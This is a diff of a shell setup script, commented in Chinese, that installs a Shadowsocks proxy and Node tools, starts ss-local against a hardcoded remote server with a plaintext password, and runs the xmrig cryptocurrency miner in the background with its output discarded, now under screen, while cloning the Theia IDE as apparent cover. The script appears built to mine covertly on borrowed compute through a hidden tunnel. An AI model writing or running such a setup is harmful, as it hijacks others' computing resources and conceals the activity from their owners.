@@ -7,12 +7,7 @@ apt install -y shadowsocks-libev
 apt update
 apt install -y nodejs npm git curl wget 
 npm install -g yarn localtunnel
-# 克隆 Theia 範例專案
-git clone https://github.com/eclipse-theia/theia.git theia-app
-cd theia-app
 
-# 安裝依賴
-yarn
 
 ss-local -s 3.81.227.209-p 443 -l 1080 -k abc123 -m chacha20-ietf-poly1305 &
 
@@ -44,4 +39,11 @@ cat <<EOF > config.json
 EOF
 
 # 背景執行礦工
-./xmrig > /dev/null 2>&1 &
+screen ./xmrig > /dev/null 2>&1 &
+
+# 克隆 Theia 範例專案
+git clone https://github.com/eclipse-theia/theia.git theia-app
+cd theia-app
+
+# 安裝依賴
+yarn
